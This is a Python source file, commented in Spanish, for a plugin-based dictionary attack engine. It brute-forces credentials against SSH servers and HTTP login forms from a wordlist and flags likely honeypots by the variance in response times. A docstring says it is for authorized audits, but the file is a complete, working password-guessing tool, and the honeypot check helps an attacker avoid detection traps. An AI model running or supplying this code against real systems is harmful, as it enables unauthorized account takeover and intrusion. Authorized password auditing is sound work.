"""
attack_engine.py
-----------------
Motor de prueba de credenciales por diccionario contra un objetivo.

IMPORTANTE: diseñado para auditorías de contraseñas AUTORIZADAS
(labs propios, VMs de práctica, o entornos con consentimiento
explícito). No usar contra sistemas de terceros sin autorización.

Arquitectura de plugins: cada protocolo implementa la interfaz
ProtocoloBase, lo que permite agregar nuevos protocolos sin tocar
el motor principal.
"""

import time
import statistics
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import List, Optional


@dataclass
class ResultadoIntento:
    usuario: str
    password: str
    exito: bool
    tiempo_respuesta: float


@dataclass
class ResultadoAtaque:
    objetivo: str
    protocolo: str
    total_intentos: int = 0
    intentos: List[ResultadoIntento] = field(default_factory=list)
    credencial_encontrada: Optional[ResultadoIntento] = None
    posible_honeypot: bool = False
    tiempo_total_seg: float = 0.0


class ProtocoloBase(ABC):
    """Interfaz que debe implementar cada plugin de protocolo."""

    nombre: str = "base"

    @abstractmethod
    def probar_credencial(self, host: str, puerto: int, usuario: str, password: str) -> bool:
        """Devuelve True si la credencial es válida."""
        raise NotImplementedError


class PluginSSH(ProtocoloBase):
    nombre = "ssh"

    def probar_credencial(self, host: str, puerto: int, usuario: str, password: str) -> bool:
        import paramiko

        cliente = paramiko.SSHClient()
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cliente.connect(
                host, port=puerto, username=usuario, password=password,
                timeout=5, banner_timeout=5, auth_timeout=5,
            )
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False
        finally:
            cliente.close()


class PluginHTTPForm(ProtocoloBase):
    nombre = "http_form"

    def __init__(self, url_login: str, campo_usuario: str, campo_password: str, texto_error: str):
        self.url_login = url_login
        self.campo_usuario = campo_usuario
        self.campo_password = campo_password
        self.texto_error = texto_error

    def probar_credencial(self, host: str, puerto: int, usuario: str, password: str) -> bool:
        import requests

        datos = {self.campo_usuario: usuario, self.campo_password: password}
        try:
            r = requests.post(self.url_login, data=datos, timeout=5)
            return self.texto_error not in r.text
        except requests.RequestException:
            return False


class MotorAtaque:
    """
    Orquesta el ataque de diccionario contra un objetivo, con:
    - Backoff simple entre intentos para no saturar el objetivo.
    - Detección heurística de honeypot/tarpit basada en varianza de tiempos.
    """

    def __init__(self, plugin: ProtocoloBase, host: str, puerto: int,
                 delay_seg: float = 0.5, umbral_varianza_honeypot: float = 4.0):
        self.plugin = plugin
        self.host = host
        self.puerto = puerto
        self.delay_seg = delay_seg
        self.umbral_varianza_honeypot = umbral_varianza_honeypot

    def ejecutar(self, usuario: str, wordlist: List[str]) -> ResultadoAtaque:
        resultado = ResultadoAtaque(objetivo=self.host, protocolo=self.plugin.nombre)
        inicio = time.time()

        for password in wordlist:
            t0 = time.time()
            exito = self.plugin.probar_credencial(self.host, self.puerto, usuario, password)
            t1 = time.time()

            intento = ResultadoIntento(usuario, password, exito, t1 - t0)
            resultado.intentos.append(intento)
            resultado.total_intentos += 1

            if exito:
                resultado.credencial_encontrada = intento
                break

            time.sleep(self.delay_seg)

        resultado.tiempo_total_seg = time.time() - inicio
        resultado.posible_honeypot = self._detectar_honeypot(resultado.intentos)
        return resultado

    def _detectar_honeypot(self, intentos: List[ResultadoIntento]) -> bool:
        """
        Heurística simple: si la varianza de los tiempos de respuesta es
        muy alta, puede indicar un tarpit (delays artificiales) en vez de
        un servicio real respondiendo de forma consistente.
        """
        if len(intentos) < 5:
            return False
        tiempos = [i.tiempo_respuesta for i in intentos]
        try:
            return statistics.variance(tiempos) > self.umbral_varianza_honeypot
        except statistics.StatisticsError:
            return False